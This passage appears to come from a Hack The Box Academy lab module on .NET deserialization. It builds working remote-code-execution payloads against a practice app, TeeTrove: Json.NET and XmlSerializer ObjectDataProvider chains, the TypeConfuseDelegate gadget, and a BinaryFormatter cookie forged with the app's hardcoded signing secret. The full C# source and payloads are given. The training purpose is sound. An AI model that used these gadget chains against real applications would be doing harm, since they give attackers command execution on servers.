string payload = "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"ObjectType\":\"<SNIP>\",\"MethodName\":\"Start\",\"MethodParameters\":{\"$type\":\"<SNIP>\",\"$values\":[\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"/c calc.exe\"]}}";
JsonConvert.DeserializeObject(payload, settings);

```

Although you would think it should work, we ran into another error. We get an error in `Process.Start` because a `"file name was not provided"`.

![image](https://academy.hackthebox.com/storage/modules/240/3/17.png)

Luckily, with a bit of trial and error, the fix is simple. We must simply move the `"MethodName"` field to after the `"MethodParameters"` field, since right now the object creation is occurring before the parameters are set. So our updated payload will look like this:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "ObjectType": "<SNIP>",
  "MethodParameters": {
    "$type": "<SNIP>",
    "$values": [
      "C:\\Windows\\System32\\cmd.exe",
      "/c calc.exe"
    ]
  },
  "MethodName": "Start"
}

```

This time, when we run the payload, a calculator process should spawn!

![image](https://academy.hackthebox.com/storage/modules/240/3/18.png)

## Exploiting TeeTrove

With a working `PoC`, let's try and exploit the JSON deserialization in `TeeTrove`, except this time instead of a calculator let's spawn `notepad.exe`, just to switch things up.

```json
<SNIP>
    "$values": [
      "C:\\Windows\\System32\\notepad.exe"
    ]
<SNIP>

```

We can log into the website with the credentials `pentest:pentest`, making sure to select the `"Remember Me"` option, replace the value of the `TTREMEMBER` cookie with our payload, and log out of the application so that the `"Remember Me"` functionality springs into action.

![image](https://academy.hackthebox.com/storage/modules/240/3/19.png)

At first, it appears that nothing is happening. However, when we attach `dnSpy` to `IIS` to observe the process, we can discern that the `ObjectDataProvider` seems to have been deserialized correctly, as indicated by the exception received.

![image](https://academy.hackthebox.com/storage/modules/240/3/21.png)

Luckily for us, if we open up [Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) from the [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), we can see that a `notepad.exe` instance was spawned as a child of `w3wp.exe` (the `IIS` process), so the payload did work after all!

![image](https://academy.hackthebox.com/storage/modules/240/3/20.png)


# Example 2: XML

## Discovering the Vulnerability

Let's look at another possibly vulnerable deserialization in `TeeTrove`, this time in the `Import` method, located in `Controllers.TeeController`.

![image](https://academy.hackthebox.com/storage/modules/240/3/22.png)

Looking through the [Microsoft documentation](https://learn.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization) there are no notices about possible security issues when using `XmlSerializer`, only this one paragraph which mentions `untrusted types` should not be serialized.

![image](https://academy.hackthebox.com/storage/modules/240/3/23.png)

Looking at the source code of the website, the expected type is clearly `TeeTrove.Models.Tee`, however, we should notice that this class name is under our control as it is sent during the request.

![image](https://academy.hackthebox.com/storage/modules/240/3/24.png)

[DotNetNuke](https://www.dnnsoftware.com/), a popular `.NET` `CMS`, was [vulnerable](https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization) to a deserialization attack in a very similar manner a few years ago (refer to the [screenshot](https://github.com/dnnsoftware/Dnn.Platform/blob/v9.9.1/DNN%20Platform/Library/Common/Utilities/XmlUtils.cs#L155) below). Essentially, if an attacker can control the type with which the `XmlSerializer` is initialized, then the deserialization is susceptible to exploitation.

![image](https://academy.hackthebox.com/storage/modules/240/3/25.png)

## Developing the Exploit

#### Taking a Look at the DNN Payload

At this point, based on the previous section, we might assume that developing the exploit is as simple as serializing an `ObjectDataProvider` once again to get `command execution`, but unfortunately it is not as straightforward this time. Reading further through the [blog post](https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization) detailing the similar DotNetNuke deserialization vulnerability, we notice that the while the XML payload does contain an `ObjectDataProvider`, it is wrapped inside an `ExpandedWrapperOfXamlReaderObjectDataProvider` tag.

```xml
<
<key="pentest-tools.com" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider>
    <ExpandedElement/>
    <MethodName>Parse</MethodName>
    <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
        <ResourceDictionary xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml' xmlns:System='clr-namespace:System;assembly=mscorlib' xmlns:Diag='clr-namespace:System.Diagnostics;assembly=system'>
            <ObjectDataProvider x:Key='LaunchCmd' ObjectType='{x:Type Diag:Process}' MethodName='Start'>
                <ObjectDataProvider.MethodParameters>
                    <System:String>cmd</System:String>
                    <System:String>/c calc</System:String>
                </ObjectDataProvider.MethodParameters>
            </ObjectDataProvider>
        </ResourceDictionary>
    </anyType>
</MethodParameters>
<ObjectInstance xsi:type="XamlReader"></ObjectInstance>
</ProjectedProperty0>
</ExpandedWrapperOfXamlReaderObjectDataProvider>
</item>
</profile>

```

Before we start blindly copying and pasting anything, let's try to understand what is going on here. After some searching online, we found the following slide from the [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf) talk at BlackHat 2017 discussing `XmlSerializer` in the context of the DotNetNuke vulnerability.

![image](https://academy.hackthebox.com/storage/modules/240/3/26.png)

The slide mentions that types with interface members can not be serialized and that this affects the `Process` class, which is what we were using with `ObjectDataProvider` in the previous exploit. However, it does also mention that we can use `XamlReader.Load` instead to lead to `remote code execution`, so let's look at this a bit closer. Essentially, `XamlReader` is just another serializer that can be used with `.NET`. We will not be able to serialize `ObjectDataProvider` directly with `XmlSerializer` to get `code execution`, but we can serialize a `XamlReader` and then pass a serialized `ObjectDataProvider` to `XamlReader` which should then result in `code execution`.

#### Creating our Payload

Let's create a new `.NET Framework Console` application called `TeeImportExploit` and start working on a payload for `XamlReader`. Reusing our `ObjectDataProvider` from before, and then adding a couple of lines to serialize the object with [XamlWriter](https://learn.microsoft.com/en-us/dotnet/api/system.windows.markup.xamlwriter?view=windowsdesktop-7.0) (the counterpart to `XamlReader`) we get this code (make sure to add the reference to `System.Windows.Markup (from PresentationFramework)` similar to the way we did with `ObjectDataProvider`):

```csharp
using System;
using System.Windows.Data;
using System.Windows.Markup;

namespace TeeImportExploit
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.ObjectType = typeof(System.Diagnostics.Process);
            odp.MethodParameters.Add("C:\\Windows\\System32\\cmd.exe");
            odp.MethodParameters.Add("/c calc");
            odp.MethodName = "Start";

            string xaml = XamlWriter.Save(odp);
            Console.WriteLine(xaml);
        }
    }
}

```

Running the program does launch the calculator, and an XAML string is written to the console, however, we notice that the method parameters are not mentioned anywhere, therefore, if we attempt to deserialize this string with `XamlReader.Load` nothing would happen.

![image](https://academy.hackthebox.com/storage/modules/240/3/27.png)

We are not able to serialize `MethodParameters`, so we need to find another way to pass the parameters to `Process.Start`. Luckily for us, `ObjectDataProvider` has another field called `ObjectInstance` which we can set to an existing `Process` object. `Process` objects have a field called `StartInfo`, which is of type `ProcessStartInfo`. This allows us to specify the `FileName` and `Arguments` in a manner that can be serialized. So let's rewrite the code like this:

```csharp
using System;
using System.Diagnostics;
using System.Windows.Data;
using System.Windows.Markup;

namespace TeeImportExploit
{
    internal class Program
    {
        static void Main(string[] args)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "C:\\Windows\\System32\\cmd.exe";
            psi.Arguments = "/c calc";

            Process p = new Process();
            p.StartInfo = psi;

            ObjectDataProvider odp = new ObjectDataProvider();
            odp.ObjectInstance = p;
            odp.MethodName = "Start";

            string xaml = XamlWriter.Save(odp);
            Console.WriteLine(xaml);
        }
    }
}

```

This time, when we run the program the calculator will spawn again and the output will be much longer. Most importantly, the file name and arguments are included in the serialized output.

![image](https://academy.hackthebox.com/storage/modules/240/3/28.png)

Let's take a closer look at the `XAML` output and clean up any unnecessary information.

```xml
<ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:sc="clr-namespace:System.Collections;assembly=mscorlib" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <ObjectDataProvider.ObjectInstance>
        <sd:Process>
            <sd:Process.StartInfo>
                <sd:ProcessStartInfo Arguments="/c calc" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="C:\Windows\System32\cmd.exe">
                    <sd:ProcessStartInfo.EnvironmentVariables>
                        <SNIP>
                    </sd:ProcessStartInfo.EnvironmentVariables>
                </sd:ProcessStartInfo>
            </sd:Process.StartInfo>
        </sd:Process>
    </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>

```

Inside the `XAML` output, we can see a very long section listing all the `environment variables`. Since we don't need any specifically defined values, we can just remove this entire section ( `sd:ProcessStartInfo.EnvironmentVariables`) to save space. Now before we do anything else, let's try deserializing the `payload` with `XamlReader.Load` just to make sure everything is working correctly so far. We can comment out the previous code and add the following lines to test:

```csharp
string payload = "<ObjectDataProvider <SNIP>";
XamlReader.Load(new MemoryStream(Encoding.ASCII.GetBytes(payload)));

```

As expected, when we run the program a calculator is spawned!

![image](https://academy.hackthebox.com/storage/modules/240/3/29.png)

#### ExpandedWrapper

At this point we have a payload for `XamlReader`, so we can get back to figuring out how we will pass this to `XmlSerializer` so that we can exploit `TeeTrove`. Going back to the slide from the BlackHat talk, we can see that it mentions a class called `ExpandedWrapper` that we need to use so that `XmlSerializer` understands runtime types.

![image](https://academy.hackthebox.com/storage/modules/240/3/30.png)

`ExpandedWrapper` is an internal `.NET Framework` class that we can use to wrap our `XamlReader` and `ObjectDataProvider` into an object which is `serializable` by `XmlSerializer`. We can comment everything else out and add the following lines to the end of our exploit program to set it up:

```csharp
string payload = "<ObjectDataProvider <SNIP>"; // The payload for XamlReader

ExpandedWrapper<XamlReader, ObjectDataProvider> expWrap = new ExpandedWrapper<XamlReader, ObjectDataProvider>();
expWrap.ProjectedProperty0 = new ObjectDataProvider();
expWrap.ProjectedProperty0.ObjectInstance = new XamlReader();
expWrap.ProjectedProperty0.MethodName = "Parse";
expWrap.ProjectedProperty0.MethodParameters.Add(payload);

```

There will be an error regarding `ExpandedWrapper` because it is not referenced. Clear this up by hovering, selecting `Show potential fixes` and then selecting `using System.Data.Services.Internal (from System.Data.Services)`.

![image](https://academy.hackthebox.com/storage/modules/240/3/63.png)

Note that we used `Parse` instead of `Load` in the code above. `Parse` calls `Load` internally, and although `Load` resulted in the calculator spawning in our previous test, only `Parse` works for this next one. Running the program like this should once again result in a calculator spawning.

![image](https://academy.hackthebox.com/storage/modules/240/3/31.png)

Now, we can add lines at the end of our program to serialize the `ExpandedWrapper` object with `XmlSerializer`:

```csharp
MemoryStream ms = new MemoryStream();
XmlSerializer xmlSerializer = new XmlSerializer(expWrap.GetType());
xmlSerializer.Serialize(ms, expWrap);
Console.WriteLine(Encoding.ASCII.GetString(ms.ToArray()));

```

Run the program one more time, and we should get a `serialized XML` output in addition to a calculator popping up on our screens.

```xml
<?xml version="1.0"?>
<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ProjectedProperty0>
    <ObjectInstance xsi:type="XamlReader" />
    <MethodName>Parse</MethodName>
    <MethodParameters>
      <anyType xsi:type="xsd:string">&lt;ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:sc="clr-namespace:System.Collections;assembly=mscorlib" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"&gt;&lt;ObjectDataProvider.ObjectInstance&gt;&lt;sd:Process&gt;&lt;sd:Process.StartInfo&gt;&lt;sd:ProcessStartInfo Arguments="/c calc" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="C:\Windows\System32\cmd.exe"&gt;&lt;/sd:ProcessStartInfo&gt;&lt;/sd:Process.StartInfo&gt;&lt;/sd:Process&gt;&lt;/ObjectDataProvider.ObjectInstance&gt;&lt;/ObjectDataProvider&gt;</anyType>
    </MethodParameters>
  </ProjectedProperty0>
</ExpandedWrapperOfXamlReaderObjectDataProvider>

```

Finally, we have a payload for `XmlSerializer` which should work. We can comment everything out once again and add the following lines to the end of the program to verify that it works:

```csharp
string payload = "<?xml version=\"1.0\"?><ExpandedWrapperOfXamlReaderObjectDataProvider <SNIP>";
XmlSerializer xmlSerializer = new XmlSerializer(new ExpandedWrapper<XamlReader, ObjectDataProvider>().GetType());
xmlSerializer.Deserialize(new MemoryStream(Encoding.ASCII.GetBytes(payload)));

```

With any luck, the calculator should spawn and we should now have a verified payload that we can adapt to work with `TeeTrove`.

![image](https://academy.hackthebox.com/storage/modules/240/3/32.png)

## Exploiting TeeTrove

So let's adapt the payload to work with `TeeTrove`, spawning `notepad.exe` again instead of the calculator by changing the values of `Arguments` and `FileName`. If you remember from earlier in the section, we can control (need to control) the type string which is used when initializing `XmlSerializer`. The intended value is `TeeTrove.Models.Tee`, but we need to set it to the string equivalent of `new ExpandedWrapper<XamlReader, ObjectDataProvider>().GetType()` so that our payload will be deserialized correctly. We can comment out all previous code lines in our program and add the following line:

```csharp
Console.WriteLine(new ExpandedWrapper<XamlReader, ObjectDataProvider>().GetType().ToString());

```

To get the following string as output:

```csharp
System.Data.Services.Internal.ExpandedWrapper`2[System.Windows.Markup.XamlReader,System.Windows.Data.ObjectDataProvider]

```

But if we supply the combination of this `type string` and our `payload`, with `dnSpy` attached, we get an error because `GetType` returned `null`.

![image](https://academy.hackthebox.com/storage/modules/240/3/33.png)

Referring back to the slide from the `BlackHat talk`, we notice that the type string in the box looks similar to ours, except there are some extra values after the closing `]` character that we don't have.

![image](https://academy.hackthebox.com/storage/modules/240/3/30.png)

Luckily this is an easy fix. If we take a look at the [Microsoft Documentation](https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-7.0) for the `Type` class, we can see a list of properties including [AssemblyQualifiedName](https://learn.microsoft.com/en-us/dotnet/api/system.type.assemblyqualifiedname?view=net-7.0#system-type-assemblyqualifiedname) which looks more like the string we want. So we can modify our line and specify that we want the `AssemblyQualifiedName` instead of calling `ToString()` like this:

```csharp
Console.WriteLine(new ExpandedWrapper<XamlReader, ObjectDataProvider>().GetType().AssemblyQualifiedName);

```

This time we should get a string that looks closer to the one in the slide:

```csharp
System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089

```

We can try the exploit again, this time passing the new type string in combination with our payload. Although we don't have the same problem this time, we run into another exception. This time `dnSpy` says `<ExpandedWrapper<SNIP>>` was not expected.

![image](https://academy.hackthebox.com/storage/modules/240/3/34.png)

What does this mean? Well, let's look at the decompiled code for the `Import` method one more time.

![image](https://academy.hackthebox.com/storage/modules/240/3/35.png)

In the screenshot above, we notice another parameter passed when instantiating `XmlSerializer`, namely an `XmlRootAttribute` with the name `Tee`. If we create a new Tee and then export it through the web UI, we also notice that the root element is called `Tee`.

![image](https://academy.hackthebox.com/storage/modules/240/3/36.png)

With this in mind, let's try renaming the root element of our payload from `ExpandedWrapperOfXamlReaderObjectDataProvider` to `Tee` and resend everything. This time, with `Process Explorer` open we should see a `notepad.exe` process spawn as a child of `w3wp.exe` and so we have our second valid `proof of concept` for `TeeTrove`!

![image](https://academy.hackthebox.com/storage/modules/240/3/37.png)


# The TypeConfuseDelegate Gadget

## Introduction

For the last two exploits, we have used the `ObjectDataProvider` gadget, but many more gadgets exist and more are discovered all the time, so let's take a look at another one called the `TypeConfuseDelegate` gadget.

## What is TypeConfuseDelegate?

`TypeConfuseDelegate` is the name of a `.NET Framework` deserialization gadget originally disclosed by [James Forshaw](https://twitter.com/tiraniddo) in [this Google Project Zero blog post](https://googleprojectzero.blogspot.com/2017/04/).

![image](https://academy.hackthebox.com/storage/modules/240/3/41.png)

The code is relatively short, but it probably doesn't make a lot of sense the first time you see it, so let's figure out what's going on.

## How does it work?

The first thing we need to understand is that this gadget begins with a class called `ComparisonComparer`, which is a `serializable`, `internal` class in the `Comparer` class.

![image](https://academy.hackthebox.com/storage/modules/240/3/38.png)

`ComparisonComparer` extends the `Comparer` class, and has an internal [Comparison<T>](https://learn.microsoft.com/en-us/dotnet/api/system.comparison-1?view=net-7.0) property. `Comparison<T>` is a special type of variable called a `Delegate`, which means it refers to another method.

```csharp
public delegate int Comparison<in T>(T x, T y);

```

Most importantly, inside the `Compare` method we see that this `delegated method` is invoked. So if we can create a `ComparisonComparer` and somehow delegate `Process.Start` as the `comparison` method, then when `Compare` is called `Process.Start` will be invoked.

Although `ComparisonComparer` is an internal class inside `Comparer`, which means it can not be instantiated by other classes than `Comparer`, it is exposed via the `Comparer.Create` method.

![image](https://academy.hackthebox.com/storage/modules/240/3/39.png)

So we have a way to create a `ComparisonComparer`, but our problem now is that `Comparison` expects a method that returns an `int`, and `Process.Start` returns a `Process` object.

This is where `MulticastDelegate` comes into play. To put it simply, a `MulticastDelegate` is just a list of `delegated` methods that are to be invoked one after another. Although we still can not delegate `Process.Start` as a `Comparison<T>` due to the return type, we can exploit a long-standing `.NET Framework` issue where type signatures are not always enforced, and overwrite an already delegated function in a `MulticastDelegate` instance with a method which returns a different type, in this case `Process.Start`.

So let's take a look at the beginning of the gadget code:

```csharp
// We delegate `string.Compare` as a new `Comparison<T>`
Delegate stringCompare = new Comparison<string>(string.Compare);

// We create a `MulticastDelegate` by chaining two `string.Compare` methods in a row
Comparison<string> multicastDelegate = (Comparison<string>) MulticastDelegate.Combine(stringCompare, stringCompare);

// We create a `ComparisonComparer` instance using `Comparer.Create` and pass the `MulticastDelegate` that we created as the `Comparison<T>` parameter to the constructor
IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);

```

At this point, we have a `ComparisonComparer` instance which will invoke two `string.Compare` methods in a row when the `Compare` method is invoked. This is where the `"Type Confusion"` comes in. Inside `MulticastDelegate` is a private field called `_invocationList` which contains the delegated methods in the order they should be invoked.

![image](https://academy.hackthebox.com/storage/modules/240/3/40.png)

Since this is a private field, we can not update it directly, however, we can get around this by using a class called `FieldInfo`:

```csharp
// Get the `FieldInfo` for `_invocationList`, specifying it is a `Non-Public`, `Instance` variable
FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);

// Get the `invocation list` from our `MulticastDelegate`
object[] invoke_list = multicastDelegate.GetInvocationList();

// Overwrite the second delegated function (`string.Compare`) with `Process.Start`
invoke_list[1] = new Func<string, string, Process>(Process.Start);
fi.SetValue(multicastDelegate, invoke_list);

```

Now we have a `MulticastDelegate` which invokes `string.Compare` followed by `Process.Start` whenever the `ComparisonComparer` invokes `Compare`. But we don't have anything that invokes `Compare` yet. This is where `SortedSet` comes in. `SortedSet` is a `Set` that automatically sorts itself each time a new item is added (assuming there are at least two items in total). To do the sorting, it invokes `Compare` on the instance's internal `Comparer` which can be specified by the user, meaning we can supply our `ComparisonComparer`.

![image](https://academy.hackthebox.com/storage/modules/240/3/44.png)

Additionally, and equally important, `SortedSet` can be serialized and upon deserialization it will add the items to a new `SortedSet` instance one by one, effectively triggering the `Compare` function.

![image](https://academy.hackthebox.com/storage/modules/240/3/42.png)

So the last few lines of the gadget are the following:

```csharp
// Create a SortedSet with our ComparisonComparer and add two strings
//   which will act as the FileName and Arguments parameters when passed
//   to Process.Start(string FileName, string Arguments)
SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer);
sortedSet.Add("/c calc");
sortedSet.Add("C:\\Windows\\System32\\cmd.exe");

```

Putting everything together, the whole gadget looks like this:

```csharp
// We delegate `string.Compare` as a new `Comparison<T>`
Delegate stringCompare = new Comparison<string>(string.Compare);

// We create a `MulticastDelegate` by chaining two `string.Compare` methods in a row
Comparison<string> multicastDelegate = (Comparison<string>) MulticastDelegate.Combine(stringCompare, stringCompare);

// We create a `ComparisonComparer` instance using `Comparer.Create` and pass the `MulticastDelegate` that we created as the `Comparison<T>` parameter to the constructor
IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);

// Get the private field _invocationList, specifying it is a Non-Public, Instance variable
FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);

// Get the invocation list from our MulticastDelegate
object[] invoke_list = multicastDelegate.GetInvocationList();

// Overwrite the second delegated function (string.Compare) with Process.Start
invoke_list[1] = new Func<string, string, Process>(Process.Start);
fi.SetValue(multicastDelegate, invoke_list);

// Create a SortedSet with our ComparisonComparer and add two strings
//   which will act as the FileName and Arguments parameters when passed
//   to Process.Start(string FileName, string Arguments)
SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer);
sortedSet.Add("/c calc");
sortedSet.Add("C:\\Windows\\System32\\cmd.exe");

```

Running the gadget, a calculator is spawned as expected, and although we have not tested it out yet, we know that the `Compare` method will be invoked upon `deserialization` as well.

![image](https://academy.hackthebox.com/storage/modules/240/3/43.png)

## Going Beyond

So far in this module, we have covered two gadgets - `ObjectDataProvider` and `TypeConfuseDelegate`. In the wild, there are many more gadgets, and researchers will often discover new ones or improve upon existing ones. A few other gadgets (not covered in this module) include:

- [PSObject](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [SessionSecurityToken](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
- [ClaimsPrincipal (in Vietnamese)](https://testbnull.medium.com/some-notes-of-microsoft-exchange-deserialization-rce-cve-2021-42321-f6750243cdcd)

Discovering these gadgets can be quite complicated, but for those of you who are keen to learn more about the process, the blog posts/papers linked to the gadgets above, as well as the following resources may be interesting:

- ["Friday the 13th JSON Attacks" White Paper](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEF%20CON%2025%20-%20Alvaro-Munoz-JSON-attacks-WP-UPDATED.pdf) / [Video of the Talk](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
- ["Are you my type?" White Paper](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [Attacking .NET Deserialization Talk](https://www.youtube.com/watch?v=eDfGpu3iE4Q)


# Example 3: Binary

## Discovering the Vulnerability

Let's look at one final deserialization vulnerability in `TeeTrove`. This time we will shift our focus to the `authentication` mechanism, which seems to use (de)serialization.

![image](https://academy.hackthebox.com/storage/modules/240/3/45.png)

In the code snippet above, we can see that `BinaryFormatter` is used to deserialize the first part of `authCookie`, which is a value stored in the `TTAUTH` cookie.

![image](https://academy.hackthebox.com/storage/modules/240/3/46.png)

A quick Google search for `"BinaryFormatter"` will return plenty of sources confirming it is insecure, in fact, the [Microsoft documentation](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=net-7.0) even contains a warning informing developers of this.

![image](https://academy.hackthebox.com/storage/modules/240/3/47.png)

## Developing the Exploit

So we know that the use of `BinaryFormatter` to deserialize user input is insecure. With this in mind, let's create a new project in `Visual Studio` and get to work developing an exploit that will work against it.

![image](https://academy.hackthebox.com/storage/modules/240/3/48.png)

Unfortunately, our `ObjectDataProvider` gadget will not work this time. We can attempt to copy the gadget code and add the following lines to `serialize` the object and output the results as a `base64`-encoded string:

```csharp
MemoryStream ms = new MemoryStream();
BinaryFormatter bf = new BinaryFormatter();
bf.Serialize(ms, odp);
Console.WriteLine(Convert.ToBase64String(ms.ToArray()));

```

However, running this code will result in an exception being thrown because `ObjectDataProvider` is not marked as a serializable class.

![image](https://academy.hackthebox.com/storage/modules/240/3/49.png)

Instead of tackling the exception, let's just put the `TypeConfuseDelegate` gadget we discussed in the previous section to use!

```csharp
// TypeConfuseDelegate gadget
Delegate stringCompare = new Comparison<string>(string.Compare);
Comparison<string> multicastDelegate = (Comparison<string>)MulticastDelegate.Combine(stringCompare, stringCompare);
IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);

FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
object[] invoke_list = multicastDelegate.GetInvocationList();
invoke_list[1] = new Func<string, string, Process>(Process.Start);
fi.SetValue(multicastDelegate, invoke_list);

SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer);
sortedSet.Add("/c calc");
sortedSet.Add("C:\\Windows\\System32\\cmd.exe");

// Serialize with BinaryFormatter (to base64 string)
MemoryStream ms = new MemoryStream();
BinaryFormatter bf = new BinaryFormatter();
bf.Serialize(ms, sortedSet);
Console.WriteLine(Convert.ToBase64String(ms.ToArray()));

```

This time, when we run the program we see the calculator spawn and a `base64`-encoded string written to the console. This is the `SortedSet` which we serialized with `BinaryFormatter`.

![image](https://academy.hackthebox.com/storage/modules/240/3/50.png)

Just to double-check that the payload works upon deserialization, let's comment all this code out and use the following lines to test:

```csharp
string payload = "AAEAAAD/////AQAAAAAAAAAM<SNIP>";
BinaryFormatter bf = new BinaryFormatter();
bf.Deserialize(new MemoryStream(Convert.FromBase64String(payload)));

```

As expected, the `SortedSet` is deserialized, and a calculator is spawned.

![image](https://academy.hackthebox.com/storage/modules/240/3/51.png)

## Exploiting TeeTrove

Now that we know how to exploit `BinaryFormatter`, let's adapt the payload to work with `TeeTrove`. In this case, we can not just copy-paste the `PoC` and expect it to work, because the cookie that stores the `serialized` data is `validated` before any `deserialization` occurs.

![image](https://academy.hackthebox.com/storage/modules/240/3/52.png)

So let's figure out how the cookie is validated, and what we have to do to bypass this check. Inside the decompiled code of `AuthCookieUtil`, we can see the implementation of the `validateSignedCookie` method.

![image](https://academy.hackthebox.com/storage/modules/240/3/53.png)

We can see the method splits the `cookie` string into two strings separated by a `"."` character and then compares the second string to the string which is generated using the `createSHA256HashB64` method with the first string as input, implemented above in the same class. The method then returns `true` if these two values match, and `false` otherwise. The `createSHA256HashB64` method computes a `SHA256` hash, as the name suggests. The input to the hash function is the string that was passed, in this case, the portion of the authentication cookie before the first period, as well as a secret string defined in `AUTH_COOKIE_SECRET`. Since we know the value of this secret string and have full control over the cookie, we can forge valid cookies with this knowledge.

So let's modify our exploit code to generate a signed cookie according to the implementation of `AuthCookieUtil`. We can copy-paste `AUTH_COOKIE_SECRET` as well as the implementation of `createSHA256HashB64` to the beginning of our exploit code.

```csharp
private static readonly string AUTH_COOKIE_SECRET = "916344019f88b8d93993afa72b593b9c";

private static string createSHA256HashB64(string session_b64)
{
    SHA256 s256 = SHA256.Create();
    byte[] hash = s256.ComputeHash(Encoding.ASCII.GetBytes(session_b64 + AUTH_COOKIE_SECRET));
    return Convert.ToBase64String(hash);
}

```

Next, let's modify the main method so that instead of `base64`-encoding and then printing the serialized object to the console, it passes it to `createSHA256HashB64`.

```csharp
<SNIP>
bf.Serialize(ms, sortedSet);
String payload_b64 = Convert.ToBase64String(ms.ToArray());

// Turn payload into a signed cookie
string hash_b64 = createSHA256HashB64(payload_b64);
Console.WriteLine(payload_b64 + "." + hash_b64);

```

Now when we run the code, we see the calculator spawn and we see `base64`-encoded output, followed by a `"."` and more `base64`-encoded output which we know is the `SHA256` hash.

![image](https://academy.hackthebox.com/storage/modules/240/3/54.png)

Now let's try using this value with the authentication cookie in `TeeTrove` ( `TTAUTH`). As usual, we will modify the payload to launch `Notepad`, and we can set breakpoints in `dnSpy` to catch any exceptions in case it goes wrong.

We can log into the application with the credentials `pentest:pentest` and then replace the value of the `TTAUTH` cookie with our payload. Inside `dnSpy` we should hit the breakpoint and then stepping forward we can see that `validateSignedCookie` returned `true`, meaning the application will go ahead with `deserialization`.

![image](https://academy.hackthebox.com/storage/modules/240/3/55.png)

Once we hit `continue`, and the cookie is `deserialized`, we should see a `notepad.exe` process spawn as a child of `w3wp.exe` in `Process Explorer` meaning we exploited this third vulnerability successfully!

![image](https://academy.hackthebox.com/storage/modules/240/3/56.png)


# Automating Exploitation with YSoSerial.NET

## Introduction

In the previous 5 sections, we `manually` took apart `two .NET Framework deserialization gadgets` and developed `three` exploits against deserialization vulnerabilities in `TeeTrove`. Although complicated, it is important to understand how to perform such attacks manually before using tools to automate the process, because the tools may not always work correctly, or there may be extra conditions that the tool can not handle such as the `Tee` root element in the 2nd vulnerability.

In this section, let's take a look at how we can use the tool `YSoSerial.NET` to (semi-)automatically generate similar payloads that we can use for exploitation.

## YSoSerial.NET

![image](https://academy.hackthebox.com/storage/modules/240/3/57.png)

[YSoSerial.NET](https://github.com/pwntester/ysoserial.net) is an open-source tool that can be used to generate payloads for `.NET` deserialization vulnerabilities. It was created by [Alvaro Muñoz](https://github.com/pwntester) who you may remember as one of the authors of the [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) talk at BlackHat 2017.

